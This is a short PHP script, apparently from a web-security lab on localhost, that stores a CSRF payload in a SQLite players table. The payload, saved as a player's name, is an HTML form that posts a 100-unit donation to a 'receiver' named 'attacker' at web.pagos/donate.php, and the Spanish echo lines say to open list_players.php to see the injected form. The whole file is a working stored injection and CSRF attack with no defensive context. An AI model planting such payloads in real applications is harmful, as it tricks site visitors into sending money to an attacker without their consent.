<?php
$db = new SQLite3(dirname(__FILE__) . '/private/database.db');

// Payload CSRF - formulario malicioso que se envía automáticamente
$csrf_payload = 'Jairo Valenzuela<br><form action="http://web.pagos/donate.php" method="POST" id="maliciousForm">
<input type="hidden" name="amount" value="100">
<input type="hidden" name="receiver" value="attacker">
<input type="submit" value="View Profile">
</form>';

$playerId = 1;

$stmt = $db->prepare('UPDATE players SET name = :name WHERE playerid = :id');
$stmt->bindValue(':name', $csrf_payload, SQLITE3_TEXT);
$stmt->bindValue(':id', $playerId, SQLITE3_INTEGER);
$stmt->execute();

echo "Formulario CSRF inyectado en el jugador con ID: $playerId\n";
echo "Ahora accede a: http://localhost:3000/web/list_players.php\n";
echo "El formulario malicioso aparecerá en el nombre del jugador.\n";
?>
